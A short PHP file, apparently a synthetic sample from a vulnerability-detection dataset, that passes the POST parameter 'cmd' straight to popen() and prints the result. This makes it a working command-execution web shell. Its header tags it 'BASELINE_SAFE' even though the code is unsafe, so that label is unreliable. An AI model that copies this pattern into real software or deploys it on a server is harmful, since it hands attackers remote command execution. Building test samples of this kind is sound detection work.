<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=POST_DIRECT; SKELETON=S1; KEY=cmd; SINK=B6; VAR=v0028 */
function SINK_B6($command){
    $handle = popen($command, "r");
            $output = '';
            while (!feof($handle)) {
                $output .= fgets($handle);
            }
            pclose($handle);
            echo $output;
}
$inp = (string)($_POST["cmd"] ?? "");
$inp = (string)$inp; // no value processing
function run_sink($x){
    return SINK_B6($x);
}
$out = run_sink($inp);
echo (string)($out);
?>
